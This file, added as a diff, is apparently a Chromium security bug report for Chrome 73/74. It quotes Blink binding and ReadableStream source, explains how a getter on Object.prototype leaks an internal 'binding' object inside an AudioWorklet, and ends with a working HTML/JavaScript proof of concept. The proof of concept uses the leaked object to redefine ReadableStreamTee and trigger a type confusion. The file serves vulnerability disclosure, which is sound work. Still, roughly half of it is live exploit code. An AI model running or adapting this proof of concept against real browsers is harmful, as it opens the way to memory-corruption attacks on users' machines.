@@ -1,0 +1,138 @@
+<!--
+VULNERABILITY DETAILS
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/bindings/core/v8/initialize_v8_extras_binding.cc?rcl=b16591511b299e0791def0b85dced2c74efc4961&l=90
+void AddOriginals(ScriptState* script_state, v8::Local<v8::Object> binding) {
+  // These values are only used when serialization is enabled.
+  if (!RuntimeEnabledFeatures::TransferableStreamsEnabled())
+    return;
+
+  v8::Local<v8::Object> global = script_state->GetContext()->Global();
+  v8::Local<v8::Context> context = script_state->GetContext();
+  v8::Isolate* isolate = script_state->GetIsolate();
+
+  const auto ObjectGet = [&context, &isolate](v8::Local<v8::Value> object,
+                                              const char* property) {
+    DCHECK(object->IsObject());
+    return object.As<v8::Object>()
+        ->Get(context, V8AtomicString(isolate, property))
+        .ToLocalChecked();
+  };
+
+[...]
+
+  v8::Local<v8::Value> message_port = ObjectGet(global, "MessagePort");
+  v8::Local<v8::Value> dom_exception = ObjectGet(global, "DOMException");
+
+  // Most Worklets don't have MessagePort. In this case, serialization will
+  // fail. AudioWorklet has MessagePort but no DOMException, so it can't use
+  // serialization for now.
+  if (message_port->IsUndefined() || dom_exception->IsUndefined()) // ***1***
+    return;
+
+  v8::Local<v8::Value> event_target_prototype =
+      GetPrototype(ObjectGet(global, "EventTarget"));
+  Bind("EventTarget_addEventListener",
+       ObjectGet(event_target_prototype, "addEventListener"));
+
+  v8::Local<v8::Value> message_port_prototype = GetPrototype(message_port);
+  Bind("MessagePort_postMessage",
+       ObjectGet(message_port_prototype, "postMessage"));
+[...]
+
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/streams/ReadableStream.js?rcl=b16591511b299e0791def0b85dced2c74efc4961&l=1044
+  function ReadableStreamSerialize(readable, port) {
+    // assert(IsReadableStream(readable),
+    //        `! IsReadableStream(_readable_) is true`);
+    if (IsReadableStreamLocked(readable)) {
+      throw new TypeError(streamErrors.cannotTransferLockedStream);
+    }
+
+    if (!binding.MessagePort_postMessage) { // ***2***
+      throw new TypeError(streamErrors.cannotTransferContext);
+    }
+
+    const writable = CreateCrossRealmTransformWritable(port);
+    const promise =
+          ReadableStreamPipeTo(readable, writable, false, false, false);
+    markPromiseAsHandled(promise);
+  }
+
+A worklet's context might not have the objects required to implement ReadableStream serialization.
+In that case, |AddOriginals| would exit early leaving the |binding| object partially initialized[1].
+|ReadableStreamSerialize| checks if the "MessagePort_postMessage" property exists on the |binding|
+object to determine whether serialization is possible[2]. The problem is that the check would be
+observable to a getter defined on |Object.prototype|, which could leak the value of |binding|.
+
+
+VERSION
+Google Chrome 73.0.3683.39 (Official Build) beta (64-bit) (cohort: Beta)
+Chromium 74.0.3712.0 (Developer Build) (64-bit)
+
+Also, please note that the "stream serialization" feature is currently hidden behind the
+"experimental platform features" flag.
+
+
+REPRODUCTION CASE
+The repro case uses the leaked |binding| object to redefine an internal method and trigger a type
+confusion.
+-->
+
+<body>
+<h1>Click to start AudioContext</h1>
+<script>
+function runInWorket() {
+  function leakBinding(port) {
+    let stream = new ReadableStream;
+    let binding;
+    Object.prototype.__defineGetter__("MessagePort_postMessage", function() {
+      binding = this;
+    });
+    try {
+      port.postMessage(stream, [stream]);
+    } catch (e) {}
+    delete Object.prototype.MessagePort_postMessage;
+    return binding;
+  }
+
+  function triggerTypeConfusion(binding) {
+    console.log(Object.keys(binding));
+
+    binding.ReadableStreamTee = function() {
+      return 0x4142;
+    }
+    let stream = new ReadableStream;
+    stream.tee();
+  }
+
+  class MyWorkletProcessor extends AudioWorkletProcessor {
+    constructor() {
+      super();
+
+      triggerTypeConfusion(leakBinding(this.port));
+    }
+
+    process() {}
+  }
+
+  registerProcessor("my-worklet-processor", MyWorkletProcessor);
+}
+let blob = new Blob([`(${runInWorket}())`], {type: "text/javascript"});
+let url = URL.createObjectURL(blob);
+
+window.onclick = () => {
+  window.onclick = null;
+
+  class MyWorkletNode extends AudioWorkletNode {
+    constructor(context) {
+      super(context, "my-worklet-processor");
+    }
+  }
+
+  let context = new AudioContext();
+
+  context.audioWorklet.addModule(url).then(() => {
+    let node = new MyWorkletNode(context);
+  });
+}
+</script>
+</body>
